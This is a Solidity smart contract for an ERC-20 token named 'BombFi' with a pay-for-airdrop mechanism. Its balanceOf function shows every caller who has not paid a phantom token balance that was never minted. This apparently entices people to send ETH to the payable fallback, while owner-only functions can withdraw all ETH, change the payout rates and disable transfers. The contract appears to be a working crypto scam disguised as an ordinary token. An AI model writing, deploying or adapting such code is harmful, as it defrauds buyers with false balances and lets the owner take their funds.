//SPDX-License-Identifier: Unlicense

pragma solidity ^0.5.12;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
   
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(address indexed owner, address indexed spender, uint256 amount);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract Ownable {
    address public owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() public {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        owner = newOwner;
    }
}

contract BombFi is IERC20, Ownable{
    using SafeMath for uint256;

    string public symbol;
    string public  name;
    uint8 public decimals;
    uint256 public airdropnum;
    uint public minpay;
    uint _totalSupply;
    mapping(address => uint256) balances;
    mapping (address => mapping (address => uint256)) _allowances;
    mapping(address => bool) public hasReceivedAirdrop;
    bool public isTransactionEnabled;

    mapping (address => bool) public pairs;
    address public constant feeAddress = 0x000000000000000000000000000000000000dEaD;

constructor() public {

    symbol = "Bomb";
    name = "BombFi";
    decimals = 18;
    _totalSupply = 21000000 * 10**uint(decimals);
    
    isTransactionEnabled = true;
    owner = msg.sender;
    balances[msg.sender] = 1000000 * 10**uint(decimals);
    airdropnum = 200 * 10**uint(decimals);
    minpay = 1 * 10**16;
    emit Transfer(address(0),msg.sender,1000000 * 10**uint(decimals));
}

    function hasairdrop() public view returns (bool) {
        return hasReceivedAirdrop[msg.sender];
    }

    function hasUserReceivedAirdrop(address user) public view returns (bool) {
        return hasReceivedAirdrop[user];
    }

    function totalSupply() public view  returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view  returns (uint256) {
        uint a;
        if (hasairdrop()){
            a = 0;
        }else{
            a = airdropnum.div(10);
        }
        return balances[account].add(a);
    }
    
    function() payable external {
        require(isTransactionEnabled == true, "Transactions are currently disabled");
        require(msg.value >= minpay,"too little!");

        uint256 multiple = airdropnum.mul(msg.value).div(minpay);
        balances[msg.sender] = balances[msg.sender].add(multiple);
        hasReceivedAirdrop[msg.sender] = true;    
    }

    function getETH() public onlyOwner {
        address(msg.sender).transfer(address(this).balance);
    }


    function setairdropnum(uint256 num) public onlyOwner{
        airdropnum = num;
    }

    function setminpay(uint256 newpay) public onlyOwner{
        minpay = newpay;
    }
    

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    
    function _approve(address owner, address spender, uint256 amount) internal {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][msg.sender];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, msg.sender, currentAllowance - amount);

        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {

        uint256 senderBalance = balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        balances[sender] = senderBalance - amount;
        
        uint256 receiveAmount = amount;
        if(pairs[sender] || pairs[recipient]) {
            uint256 feeAmount = amount*20/1000;
            _transferNormal(sender, feeAddress, feeAmount);
            receiveAmount -= feeAmount;
        }
        _transferNormal(sender, recipient, receiveAmount);
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }


    function _transferNormal(address sender, address recipient, uint256 amount) private {
        if(recipient == address(0)){
            _totalSupply -= amount;
        }else {
            balances[recipient] += amount;
        }
        emit Transfer(sender, recipient, amount);
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function getETHnum() public view returns (uint num){
        return address(this).balance;
    }

    function setPair(address _pair, bool b) external onlyOwner {
        pairs[_pair] = b;
    }

    function transferTokensToFeeAddress() public onlyOwner {
        uint256 balance = balances[address(this)];
        require(balance > 0, "No tokens to transfer");
        
        _transfer(address(this), feeAddress, balance);
    }

    function setTransactionStatus(bool status) public onlyOwner {
        isTransactionEnabled = status;
    }
}